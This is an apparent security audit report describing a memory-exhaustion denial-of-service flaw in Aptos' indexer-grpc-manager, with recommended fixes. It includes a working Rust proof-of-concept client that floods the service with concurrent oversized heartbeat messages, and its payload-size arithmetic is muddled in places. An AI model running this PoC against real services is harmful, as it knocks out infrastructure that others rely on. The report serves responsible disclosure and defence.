# Audit Report

## Title
Memory Exhaustion via Concurrent Large gRPC Heartbeat Messages in Indexer Manager

## Summary
The indexer-grpc-manager service allows clients to send gRPC messages up to 256MB in size with no concurrent request limiting, enabling attackers to exhaust server memory by sending multiple large HeartbeatRequest messages simultaneously. Combined with the service's practice of storing these messages in memory, this creates a practical denial-of-service attack vector.

## Finding Description

The indexer-grpc-manager service has three critical design flaws that combine to create a memory exhaustion vulnerability:

**1. Excessive MAX_MESSAGE_SIZE (256MB)** [1](#0-0) 

This constant is applied to both incoming and outgoing gRPC messages: [2](#0-1) 

**2. No Concurrent Request Limiting**

The gRPC server is configured without any concurrency controls: [3](#0-2) 

Unlike other services in the Aptos codebase that use Semaphores or max_concurrent_requests configuration, the indexer-grpc-manager has no such protection. The tonic Server::builder() by default handles requests concurrently via tokio without limits.

**3. In-Memory Storage of Full Messages**

HeartbeatRequest messages are deserialized and stored completely in memory: [4](#0-3) 

The entire `info` structure (potentially up to 256MB) is pushed into a VecDeque and persists beyond the request lifetime.

**Attack Scenario:**

An attacker can craft HeartbeatRequest messages approaching the 256MB limit by including a LiveDataServiceInfo with extensive StreamInfo data: [5](#0-4) 

A malicious ServiceInfo can contain:
- Thousands of ActiveStream entries (line 32: `repeated ActiveStream active_streams`)
- Each with StreamProgress containing thousands of samples (line 19: `repeated StreamProgressSampleProto samples`)
- Total payload approaching 256MB per request

Example calculation:
- 10,000 active streams
- Each with 1,000 progress samples  
- Each sample ~32 bytes (timestamp + version + size_bytes + protobuf overhead)
- Total: 10,000 × 1,000 × 32 ≈ 320MB compressed, ~256MB after compression

**Exploitation Steps:**

1. Attacker opens 20-30 concurrent gRPC connections to the indexer-grpc-manager
2. Each connection sends a HeartbeatRequest with a crafted ServiceInfo (200-250MB)
3. Server accepts and deserializes all requests concurrently (no rate limiting)
4. Each request's info structure is stored in the DashMap (line 503 of metadata_manager.rs)
5. Total memory consumption: 20 connections × 250MB = 5GB
6. Combined with the 5GB transaction cache, total exceeds typical server memory allocation
7. Server experiences OOM or severe performance degradation [6](#0-5) 

The default cache configuration adds another 5GB of memory usage, making the attack more effective.

## Impact Explanation

This vulnerability qualifies as **High Severity** based on Aptos bug bounty criteria for causing "API crashes". 

The indexer-grpc-manager is a critical API service that:
- Provides transaction data to indexer clients
- Coordinates between data services and fullnodes
- Serves as infrastructure for ecosystem applications

An attacker can:
- Crash the indexer-grpc-manager service via OOM
- Cause severe performance degradation affecting all clients
- Force service restarts and data availability gaps
- Impact ecosystem applications relying on indexed data

While this doesn't affect consensus or validator operations directly, it disrupts critical infrastructure services that applications depend on.

## Likelihood Explanation

**Likelihood: High**

The attack is highly feasible because:

1. **No authentication required**: The gRPC endpoint accepts connections from any client
2. **Simple to execute**: Standard gRPC clients can craft the malicious payloads
3. **Low resource cost for attacker**: 20-30 concurrent connections with crafted protobuf messages
4. **Guaranteed impact**: Memory exhaustion is deterministic with sufficient concurrent requests
5. **No recovery mechanism**: Service requires manual restart or OOM killer intervention

The attack requires only:
- Basic gRPC client implementation skills
- Understanding of protobuf structure (publicly documented)
- Modest bandwidth (20-30 connections × 256MB ≈ 5-7GB total over network)

## Recommendation

Implement multiple layers of protection:

**1. Add Concurrent Request Limiting**

```rust
use tower::limit::ConcurrencyLimit;

let service = GrpcManagerServer::new(...)
    .send_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Zstd)
    .max_encoding_message_size(MAX_MESSAGE_SIZE)
    .max_decoding_message_size(MAX_MESSAGE_SIZE);

// Wrap service with concurrency limit
let limited_service = ConcurrencyLimit::new(service, 100);

let server = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .add_service(limited_service);
```

**2. Reduce MAX_MESSAGE_SIZE**

Reduce from 256MB to a more reasonable limit (e.g., 10-20MB) and validate that legitimate use cases don't require such large messages.

**3. Add Request Rate Limiting**

Implement per-IP rate limiting using a token bucket or similar mechanism.

**4. Add Validation on HeartbeatRequest**

Add validation to reject ServiceInfo messages with excessive active_streams or samples:

```rust
fn validate_service_info(info: &LiveDataServiceInfo) -> Result<()> {
    const MAX_ACTIVE_STREAMS: usize = 1000;
    const MAX_SAMPLES_PER_STREAM: usize = 100;
    
    if let Some(stream_info) = &info.stream_info {
        ensure!(
            stream_info.active_streams.len() <= MAX_ACTIVE_STREAMS,
            "Too many active streams: {}", stream_info.active_streams.len()
        );
        
        for stream in &stream_info.active_streams {
            if let Some(progress) = &stream.progress {
                ensure!(
                    progress.samples.len() <= MAX_SAMPLES_PER_STREAM,
                    "Too many samples in stream {}", stream.id
                );
            }
        }
    }
    Ok(())
}
```

**5. Implement Memory-Based Backpressure**

Monitor total memory usage and reject new requests when memory pressure is high.

## Proof of Concept

```rust
// malicious_client.rs
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    ActiveStream, HeartbeatRequest, LiveDataServiceInfo,
    ServiceInfo, StreamInfo, StreamProgress, StreamProgressSampleProto,
};
use aptos_protos::util::timestamp::Timestamp;
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://[INDEXER_GRPC_MANAGER_ADDRESS]:8084";
    
    // Create large payload
    let mut active_streams = Vec::new();
    
    // Create 8,000 streams each with 1,000 samples (~256MB total)
    for stream_id in 0..8000 {
        let mut samples = Vec::new();
        for version in 0..1000 {
            samples.push(StreamProgressSampleProto {
                timestamp: Some(Timestamp {
                    seconds: 1234567890,
                    nanos: 0,
                }),
                version,
                size_bytes: 1024,
            });
        }
        
        active_streams.push(ActiveStream {
            id: format!("stream_{}", stream_id),
            start_time: Some(Timestamp {
                seconds: 1234567890,
                nanos: 0,
            }),
            start_version: 0,
            end_version: Some(1000),
            progress: Some(StreamProgress { samples }),
        });
    }
    
    let service_info = ServiceInfo {
        address: Some("malicious_client".to_string()),
        info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
            chain_id: 1,
            timestamp: Some(Timestamp {
                seconds: 1234567890,
                nanos: 0,
            }),
            known_latest_version: Some(1000),
            stream_info: Some(StreamInfo { active_streams }),
            min_servable_version: Some(0),
        })),
    };
    
    let request = HeartbeatRequest {
        service_info: Some(service_info),
    };
    
    // Spawn 25 concurrent connections
    let mut handles = vec![];
    for i in 0..25 {
        let target = target.to_string();
        let request = request.clone();
        
        let handle = tokio::spawn(async move {
            let channel = Channel::from_shared(target)
                .unwrap()
                .connect()
                .await
                .unwrap();
            let mut client = GrpcManagerClient::new(channel)
                .max_encoding_message_size(256 * 1024 * 1024)
                .max_decoding_message_size(256 * 1024 * 1024);
            
            println!("Client {} sending large heartbeat...", i);
            let result = client.heartbeat(request).await;
            println!("Client {} result: {:?}", i, result);
        });
        
        handles.push(handle);
    }
    
    // Wait for all requests to complete
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Attack completed. Monitor target memory usage.");
    Ok(())
}
```

Run this PoC against a test indexer-grpc-manager instance and observe memory consumption spike to 5-6GB+, potentially causing OOM or severe performance degradation.

## Notes

This vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The combination of 256MB message size, no concurrent request limits, and in-memory storage violates basic resource management principles.

While the indexer-grpc-manager is not a consensus-critical component, it provides essential infrastructure for the Aptos ecosystem. Availability attacks against this service impact all applications relying on indexed blockchain data.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L44-48)
```rust
const fn default_cache_config() -> CacheConfig {
    CacheConfig {
        max_cache_size: 5 * (1 << 30),
        target_cache_size: 4 * (1 << 30),
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L99-100)
```rust
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-104)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L503-503)
```rust
        entry.value_mut().recent_states.push_back(info);
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L18-32)
```text
message StreamProgress {
  repeated StreamProgressSampleProto samples = 1;
}

message ActiveStream {
  string id = 1;
  optional aptos.util.timestamp.Timestamp start_time = 2;
  uint64 start_version = 3;
  optional uint64 end_version = 4;

  optional StreamProgress progress = 5;
}

message StreamInfo {
  repeated ActiveStream active_streams = 1;
```
